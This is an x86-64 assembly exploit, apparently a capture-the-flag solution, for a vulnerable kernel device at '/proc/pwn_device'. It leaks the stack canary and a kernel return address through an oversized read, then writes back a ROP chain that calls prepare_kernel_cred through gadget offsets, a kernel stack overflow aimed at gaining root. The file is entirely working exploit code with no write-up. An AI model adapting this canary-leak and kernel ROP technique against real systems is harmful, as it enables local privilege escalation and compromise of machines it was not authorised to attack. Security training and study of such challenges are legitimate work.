bits 64

prepare_kernel_cred_addr equ 0xffffffffbae881c0
sread_return_addr equ 0xffffffffbb03e347

read_amount equ 0x140
read_canary_offset equ 0x80
read_retaddr_offset equ 0x90

gadget_pop_rdi equ 0xac9
gadget_ret equ 0xaca
gadget_write_to_rdi equ 0xc0a9

write_canary_offset equ 0x80
write_retaddr_offset equ 0x90
write_amount equ (write_retaddr_offset + 0x38)

section .text

global _start
_start:
	; open device file
	mov eax, 2
	mov rdi, device_file
	mov esi, 2
	syscall
	test rax, rax
	js error
	mov [fd], rax

	; extend write limit (ioctl)
	mov eax, 16
	mov rdi, [fd]
	mov esi, 0x20
	mov edx, 0x77777777
	syscall

	; read data
	xor eax, eax
	mov rdi, [fd]
	mov rsi, read_buf
	mov edx, read_amount
	syscall

	; construct payload
	mov rax, [read_buf + read_canary_offset]
	mov [payload_buf + write_canary_offset], rax
	mov rdx, [read_buf + read_retaddr_offset]
	; pop rdi; ret
	lea rax, [rdx + gadget_pop_rdi]
	mov [payload_buf + write_retaddr_offset], rax
	; 0
	mov qword [payload_buf + (write_retaddr_offset + 0x08)], 0
	; ret
	lea rax, [rdx + gadget_ret]
	mov [payload_buf + (write_retaddr_offset + 0x10)], rax
	; prepare_kernel_cred
	lea rax, [rdx + (prepare_kernel_cred_addr - sread_return_addr)]
	mov [payload_buf + (write_retaddr_offset + 0x18)], rax
	; pop rdi; ret
	lea rax, [rdx + gadget_pop_rdi]
	mov [payload_buf + (write_retaddr_offset + 0x20)], rax
	; 0
	mov qword [payload_buf + (write_retaddr_offset + 0x28)], 0
	; mov dword [rdi], 1
	lea rax, [rdx + gadget_write_to_rdi]
	mov [payload_buf + (write_retaddr_offset + 0x30)], rax

	; write payload (error should happen)
	mov eax, 1
	mov rdi, [fd]
	mov rsi, payload_buf
	mov edx, write_amount
	syscall

	; error didn't happen, so error :(
error:
	mov eax, 1
	mov edi, 1
	mov rsi, error_text
	mov edx, error_text_end - error_text
	syscall
	mov eax, 60
	mov edi, 1
	syscall

section .data

device_file:
	db '/proc/pwn_device', 0

error_text:
	db 'error', 0x0a
error_text_end:

section .bss

fd:
	resq 1

read_buf:
	resb read_amount

payload_buf:
	resb write_amount
